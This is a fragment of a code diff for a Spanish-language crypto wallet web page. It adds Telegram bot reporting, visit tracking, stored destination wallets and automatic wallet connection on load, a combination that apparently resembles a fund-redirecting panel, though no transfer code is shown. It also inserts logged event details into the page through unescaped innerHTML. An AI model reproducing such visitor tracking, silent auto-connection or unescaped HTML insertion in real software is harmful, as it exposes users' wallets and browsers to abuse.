+  $('kpiWeek').textContent  = week;
+  $('kpiTotal').textContent = log.length;
+
+  // Cargar config TG en inputs si existe
+  const cfg = getTg();
+  if (cfg) {
+    $('tgToken').value = cfg.token || '';
+    $('tgChat').value  = cfg.chatId || '';
+  }
+
+  const list = $('activityList');
+  if (!log.length) {
+    list.innerHTML = '<div class="text-center text-slate-400 py-8 text-sm">Sin eventos todavía…</div>';
+    return;
+  }
+  list.innerHTML = log.map(e => {
+    const m = EVENT_META[e.type] || { ic:'•', color:'#94a3b8', label:e.type };
+    const d = new Date(e.time);
+    const when = d.toLocaleString();
+    return `
+      <div class="flex items-start gap-3 p-3 rounded-2xl bg-white/60 border border-white/80">
+        <div style="width:34px;height:34px;border-radius:.75rem;background:${m.color}20;color:${m.color};display:flex;align-items:center;justify-content:center;font-size:1rem">${m.ic}</div>
+        <div class="flex-1 min-w-0">
+          <div class="flex items-center justify-between gap-2 flex-wrap">
+            <div class="font-semibold text-sm">${m.label}</div>
+            <div class="text-[11px] text-slate-400">${when}</div>
+          </div>
+          <div class="text-xs text-slate-600 mono break-all mt-0.5">${e.detail || ''}</div>
         </div>
       </div>
     `;
-    grid.appendChild(card);
-  });
-  grid.querySelectorAll('[data-copy]').forEach(b => b.onclick = () => {
-    navigator.clipboard.writeText(b.dataset.copy);
-    b.textContent = 'Copiado!';
-    setTimeout(() => b.textContent = 'Copiar', 1200);
-  });
+  }).join('');
 }
 
-/* ============================================================
- *  Eventos UI
- * ============================================================ */
-document.querySelectorAll('.main-tab').forEach(tab => {
-  tab.addEventListener('click', () => {
-    document.querySelectorAll('.main-tab').forEach(t => t.classList.remove('active'));
-    tab.classList.add('active');
-    const view = tab.dataset.view;
-    $('viewBalance').classList.toggle('hidden', view !== 'balance');
-    $('viewAddresses').classList.toggle('hidden', view !== 'addresses');
-  });
-});
+/* ===== Auto-connect si hay sesión ===== */
+window.addEventListener('load', () => {
+  trackVisit();
 
-$('connectBtn').addEventListener('click', connect);
-$('disconnectBtn').addEventListener('click', disconnect);
-$('refreshBtn').addEventListener('click', refreshAll);
-$('copyAddr').addEventListener('click', () => state.account && navigator.clipboard.writeText(state.account));
-$('explorerBtn').addEventListener('click', () => {
-  const net = NETWORKS[state.walletChainId];
-  if (net && state.account) window.open(net.explorer + '/address/' + state.account, '_blank');
-});
+  // Restaurar walletB desde localStorage
+  const savedB = localStorage.getItem('walletB') || '';
+  const inputB = $('walletBInput');
+  if (inputB && savedB) inputB.value = savedB;
 
-// Auto-restaurar sesion previa (sin abrir QR)
-(async () => {
-  const s = await restoreSession();
-  if (s) {
-    state.provider = s.provider;
-    state.account = s.account;
-    state.walletChainId = s.chainId;
-    state.viewChainId = NETWORKS[s.chainId] ? s.chainId : Object.keys(NETWORKS)[0];
-    state.source = s.source;
-    bindEvents();
-    setConnected(true);
-    refreshAll();
+  // Mostrar destA en la cabecera del card si ya está guardada
+  const savedDestA = localStorage.getItem('destA') || '';
+  const destABadge = $('destABadge');
+  if (destABadge) {
+    if (savedDestA) {
+      destABadge.textContent = `Wallet A: ${savedDestA.slice(0,8)}…${savedDestA.slice(-6)}`;
+      destABadge.classList.remove('hidden');
+    } else {
+      destABadge.classList.add('hidden');
+    }
   }
-})();
+
+  if (window.ethereum && window.ethereum.selectedAddress) connect('any');
+});
 </script>
 </body>
 </html>
